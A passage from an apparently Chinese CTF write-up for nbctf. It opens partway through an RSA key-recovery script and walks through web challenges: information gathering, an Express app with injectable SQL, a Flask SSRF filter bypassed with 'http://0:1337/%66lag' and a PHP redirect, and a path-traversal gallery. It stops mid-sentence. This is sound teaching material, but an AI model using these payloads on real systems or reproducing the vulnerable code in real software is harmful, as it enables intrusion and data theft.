class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p3  <span class="comment">#p3因为低位截断了 所以一定是比真实值小的 补充一个x</span></span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^<span class="number">200</span>, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment">#求小根 其中第一个参数是2的kbits次方可以保证最后解得的小根是kbits位  就是缺失的位数</span></span><br><span class="line"><span class="built_in">print</span>(x0)</span><br><span class="line">p = p3+x0</span><br></pre></td></tr></table></figure><p>到此完美结束</p><p>调试exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#p3已知高位 这里的n就是N3</span></span><br><span class="line">hint = <span class="number">12227137598952006551839416663729660224872609953685427677011433223002140448682395830146750981200</span></span><br><span class="line">n = <span class="number">90166344558664675592644684556355545187373291859609367810958775310181360193141550862577281658089332577942193823477148064165061303827534169112815736618901965700400798345371758370344207077280925015891945591352156370597957742921722432314582261224366498475465730899163137511778647694175484386010210005826793007961</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#本事</span></span><br><span class="line">p_ = var(<span class="string">&#x27;p_&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bin</span>(hint))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(<span class="string">&#x27;&#x27;&#x27;1011101110010011010101000011101100111111011011011000000110101111000000010110010000010011100111010100001100100111011000100101100011111011100110110000110011011100100011111110111110000111110000010100001001111001100001100110000111011011011001011111111101000010111101000011010011110001011111100111000111010010001010000&#x27;&#x27;&#x27;</span>))</span><br><span class="line">approx_p_plus_q = hint &lt;&lt; <span class="number">200</span></span><br><span class="line">approx_p = <span class="built_in">int</span>((p_*(approx_p_plus_q - p_) - n).roots()[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(approx_p)</span><br><span class="line"><span class="comment">#解出p的低位</span></span><br><span class="line">p3=<span class="number">7304778595800693962623587470016492934656897172638927993210828812588740492194432727308053205092654458616385476570357533214681567145360876311971890757777044</span></span><br><span class="line"><span class="comment">#sage</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#p3已知高位 这里的n就是N3</span></span><br><span class="line"><span class="comment"># p3 = 7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902</span></span><br><span class="line"><span class="comment"># n = 113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#全位数</span></span><br><span class="line"><span class="comment"># pbits = 512</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#缺省位数</span></span><br><span class="line"><span class="comment"># kbits = pbits - p3.nbits()#nbits()位数</span></span><br><span class="line"><span class="comment"># print (p3.nbits())</span></span><br><span class="line"><span class="comment"># p3 = p3 &lt;&lt; kbits   #反方向移动缺省的位数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bin</span>(p3))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(<span class="string">&#x27;&#x27;&#xx27;&#x27;&#x27;</span>))</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p3  <span class="comment">#p3因为低位截断了 所以一定是比真实值小的 补充一个x</span></span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^<span class="number">200</span>, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment">#求小根 其中第一个参数是2的kbits次方可以保证最后解得的小根是kbits位  就是缺失的位数</span></span><br><span class="line"><span class="built_in">print</span>(x0)</span><br><span class="line">p = p3+x0</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;p: &quot;</span>, <span class="built_in">hex</span>(<span class="built_in">int</span>(p)))</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="comment">#assert是断言语句 如果是true 则正常执行 如果是false 则程序运行中断</span></span><br><span class="line"><span class="comment"># assert n % p == 0</span></span><br><span class="line">q = n // <span class="built_in">int</span>(p)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line">ct = <span class="number">20030315247290021934293927354887580426070566017560641204155610658927917290198737029903594702064351773446005018155094643288125396810753014936800515440652855824038470725838848349666236623899089094953181436465435270989651491997801177943499187812270081592263331832916362349716591828106306150603120693022149233534</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = gmpy2.invert(e,<span class="built_in">int</span>(phi))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(ct,d,n))))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;############test#####################&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bin</span>(approx_p))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bin</span>(p))</span><br></pre></td></tr></table></figure><p>flag:<code>b'nbctf&#123;cr34t1v3_fl4gs_4r3_s0_h4rd_t0_m4k3...&#125;'</code></p><h2 id="web-inspector-gadget">web/Inspector Gadget</h2><h3 id="题面：">题面：</h3><p>While snooping around this website, inspector gadet lost parts of his flag. Can you help him find it?</p><h3 id="题目：">题目：</h3><p><a href="https://inspector-gadget.chal.nbctf.com">inspector-gadget.chal.nbctf.com</a></p><h3 id="考点：信息收集">考点：信息收集</h3><p>F12</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206180159384.png" alt="image-20231206180159384"></p><p>直接在控制台跑一下<code>getflag()</code>函数</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206180248579.png" alt="image-20231206180248579"></p><p>图片遮盖</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206180335228.png" alt="image-20231206180335228"></p><hr><p>下面有很多点击功能点</p><p>挨个试一试</p><p><strong><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206180714726.png" alt="image-20231206180714726"></strong></p><p>进去之后</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206180743641.png" alt="image-20231206180743641"></p><p>title中发现flag</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206180822341.png" alt="image-20231206180822341"></p><p>信息泄露 robots.txt</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206180907075.png" alt="image-20231206180907075"></p><p>flag:<code>nbctf&#123;G00d_J06_D3tect1v3_G4dg3t352&#125;</code></p><h2 id="web-walter-s-crystal-shop">web/walter’s crystal shop</h2><h3 id="题面：">题面：</h3><p>My buddy Walter is selling some crystals, check out his shop!</p><h3 id="题目：">题目：</h3><p><a href="https://walters-crystal-shop.chal.nbctf.com">walters-crystal-shop.chal.nbctf.com</a></p><p>给出源码 直接打开app.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> sqlite3 = <span class="built_in">require</span>(<span class="string">&quot;sqlite3&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> db = <span class="keyword">new</span> sqlite3.<span class="title class_">Database</span>(<span class="string">&quot;:memory:&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flag = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;./flag.txt&quot;</span>, &#123; <span class="attr">encoding</span>: <span class="string">&quot;utf8&quot;</span> &#125;).<span class="title function_">trim</span>();</span><br><span class="line"><span class="keyword">const</span> crystals = <span class="built_in">require</span>(<span class="string">&quot;./crystals&quot;</span>);</span><br><span class="line"></span><br><span class="line">db.<span class="title function_">serialize</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  db.<span class="title function_">run</span>(<span class="string">&quot;CREATE TABLE crystals (name TEXT, price REAL, quantity INTEGER)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> stmt = db.<span class="title function_">prepare</span>(<span class="string">&quot;INSERT INTO crystals (name, price, quantity) VALUES (?, ?, ?)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> crystal <span class="keyword">of</span> crystals) &#123;</span><br><span class="line">    stmt.<span class="title function_">run</span>(crystal[<span class="string">&quot;name&quot;</span>], crystal[<span class="string">&quot;price&quot;</span>], crystal[<span class="string">&quot;quantity&quot;</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  stmt.<span class="title function_">finalize</span>();</span><br><span class="line"></span><br><span class="line">  db.<span class="title function_">run</span>(<span class="string">&quot;CREATE TABLE IF NOT EXISTS flag (flag TEXT)&quot;</span>);</span><br><span class="line">  db.<span class="title function_">run</span>(<span class="string">`INSERT INTO flag (flag) VALUES (&#x27;<span class="subst">$&#123;flag&#125;</span>&#x27;)`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/crystals&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; name &#125; = req.<span class="property">query</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!name) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(&#123; <span class="attr">err</span>: <span class="string">&quot;Missing required fields&quot;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  db.<span class="title function_">all</span>(<span class="string">`SELECT * FROM crystals WHERE name LIKE &#x27;%<span class="subst">$&#123;name&#125;</span>%&#x27;`</span>, <span class="function">(<span class="params">err, rows</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(err.<span class="property">message</span>);</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Internal server error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">send</span>(rows);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">sendfile</span>(__dirname + <span class="string">&quot;/index.html&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Server listening on port 3000&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="考点：代码审计-sql注入">考点：代码审计 SQL注入</h3><h3 id="解题：">解题：</h3><p>通过代码审计 得到路由和参数</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206182417672.png" alt="image-20231206182417672"></p><p>路由：<code>crystals</code></p><p>参数：<code>name</code></p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206182456391.png" alt="image-20231206182456391"></p><p>明确参数数量为3</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206182519692.png" alt="image-20231206182519692"></p><p>明确flag在数据库中的位置</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206182542740.png" alt="image-20231206182542740"></p><p>明确闭合方式 单引号闭合</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206182623878.png" alt="image-20231206182623878"></p><p>flag：<code>nbctf&#123;h0p3fuLLy_7h3_D3A_d035n7_kn0w_ab0ut_th3_0th3r_cRyst4l5&#125;</code></p><h2 id="web-secret-tunnel">web/secret tunnel</h2><h3 id="题面：">题面：</h3><p>Can you find the flag on the other end of my secret tunnel?</p><h3 id="题目：">题目：</h3><p><a href="https://secret-tunnel.chal.nbctf.com">secret-tunnel.chal.nbctf.com</a></p><p><a href="http://main.py">main.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, Response</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">app = Flask(__name__,</span><br><span class="line">            static_url_path=<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            static_folder=<span class="string">&quot;static&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/fetchdata&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetchdata</span>():</span><br><span class="line">    url = request.form[<span class="string">&quot;url&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;127&quot;</span> <span class="keyword">in</span> url:</span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">&quot;No loopback for you!&quot;</span>, mimetype=<span class="string">&quot;text/plain&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> url.count(<span class="string">&#x27;.&#x27;</span>) &gt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">&quot;Only 2 dots allowed!&quot;</span>, mimetype=<span class="string">&quot;text/plain&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;x&quot;</span> <span class="keyword">in</span> url:</span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">&quot;I don&#x27;t like twitter &gt;:(&quot;</span> , mimetype=<span class="string">&quot;text/plain&quot;</span>) </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> url:</span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">&quot;It&#x27;s not gonna be that easy :)&quot;</span>, mimetype=<span class="string">&quot;text/plain&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.get(url)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> Response(<span class="built_in">str</span>(e), mimetype=<span class="string">&quot;text/plain&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Response(res.text[:<span class="number">32</span>], mimetype=<span class="string">&quot;text/plain&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="http://flag.py">flag.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/flag&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> Response(flag, mimetype=<span class="string">&quot;text/plain&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(port=<span class="number">1337</span>)</span><br></pre></td></tr></table></figure><h3 id="考点：ssrf">考点：SSRF</h3><h3 id="解题：">解题：</h3><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206215124712.png" alt="image-20231206215124712"></p><p>明确4个限制</p><p>大体就知道是想让我们去访问内网的flag路由</p><p>那么在linux系统中</p><p>代替127.0.0.1的有很多</p><p>比如</p><p><code>0</code> <code>localhost</code></p><p>然后根据flag.py知道对于端口为<code>1337</code></p><p>同时flag需要转换 采用URL编码</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206215509152.png" alt="image-20231206215509152"></p><p>换一个f就行了</p><p>payload:<code>http://0:1337/%66lag</code></p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206215555967.png" alt="image-20231206215555967"></p><p>法二：</p><p>用自己的服务器利用重定向跳转</p><p>输入框 =&gt; 自己的服务器 =&gt; 重定向访问到内网的flag路由</p><p>写在服务器的内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:http://127.0.0.1:1337/flag&quot;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web-galleria">web/Galleria</h2><h3 id="题面：">题面：</h3><p>Put up some fun images for everyone in this amazing image gallery!</p><h3 id="题目：">题目：</h3><p><a href="http://app.py">app.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, send_file</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;uploads&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    allowed_extensions = &#123;<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> allowed_extensions</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    file = request.files[<span class="string">&#x27;image&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        file.seek(<span class="number">0</span>, os.SEEK_END)</span><br><span class="line">        <span class="keyword">if</span> file.tell() &gt; <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;File is too large&quot;</span>, <span class="number">413</span></span><br><span class="line"></span><br><span class="line">        file.seek(<span class="number">0</span>)</span><br><span class="line">        filename = secure_filename(os.path.basename(file.filename))</span><br><span class="line">        file.save(os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;gallery&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_file_path</span>(<span class="params">path</span>):</span><br><span class="line">    _path = Path(path)</span><br><span class="line"></span><br><span class="line">    parts = [*Path.cwd().parts][<span class="number">1</span>:]</span><br><span class="line">    <span class="keyword">for</span> part <span class="keyword">in</span> _path.parts:</span><br><span class="line">        <span class="keyword">if</span> part == <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> part == <span class="string">&#x27;..&#x27;</span>:</span><br><span class="line">            parts.pop()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            parts.append(part)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(parts) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    _path = os.path.join(os.getcwd(), path)</span><br><span class="line">    _path = Path(_path)</span><br><span class="line">    <span class="keyword">return</span> _path.exists() <span class="keyword">and</span> _path.is_file()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/gallery&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gallery</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;file&#x27;</span>):</span><br><span class="line">        filename = os.path.join(<span class="string">&#x27;uploads&#x27;</span>, request.args.get(<span class="string">&#x27;file&#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check_file_path(filename):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;gallery&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> send_file(filename)</span><br><span class="line"></span><br><span class="line">    image_files = [f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(</span><br><span class="line">        app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>])]</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;gallery.html&#x27;</span>, images=image_files)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, port=<span class="number">5000</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>dockerfile:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.11</span>-slim AS app</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /var/www/html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip3 install --no-cache-dir flask</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> uploads</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> app.py .</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> templates ./templates</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> flag.txt /tmp/flag.txt</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;python3&quot;</span>, <span class="string">&quot;app.py&quot;</span>]</span></span><br></pre></td></tr></table></figure><h3 id="考点：代码审查">考点：代码审查</h3><h3 id="解题：">解题：</h3><p>我们先没有看源码的情况下 上传一张图片 